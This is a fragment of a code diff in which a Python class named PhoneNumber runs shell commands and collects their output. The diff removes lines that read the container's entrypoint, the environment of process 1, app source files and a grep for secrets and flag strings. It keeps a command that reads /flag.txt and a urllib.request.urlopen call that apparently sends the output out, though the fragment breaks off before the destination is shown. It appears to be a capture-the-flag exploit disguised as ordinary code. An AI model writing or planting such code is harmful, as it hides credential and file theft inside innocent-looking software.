@@ -62,11 +62,6 @@ class PhoneNumber:
                 return r.stdout + r.stderr
 
             out = ""
-            out += "=ENTRY=\n" + run("cat /entrypoint.sh") + "\n"
-            out += "=PROC1ENV=\n" + run("cat /proc/1/environ | tr '\\0' '\\n'") + "\n"
-            out += "=APPSRC=\n" + run("find /app -type f | head -30") + "\n"
-            out += "=APPFILES=\n" + run("cat /app/src/*.py /app/src/**/*.py 2>/dev/null | head -100") + "\n"
-            out += "=FIND_SECRET=\n" + run("grep -r 'MPTC{\\|flag{\\|CTF{\\|secret' /app /etc/environment /root 2>/dev/null | head -20") + "\n"
             out += "=CAT FILE=\n" + run("cat /flag.txt") + "\n"
 
             urllib.request.urlopen(
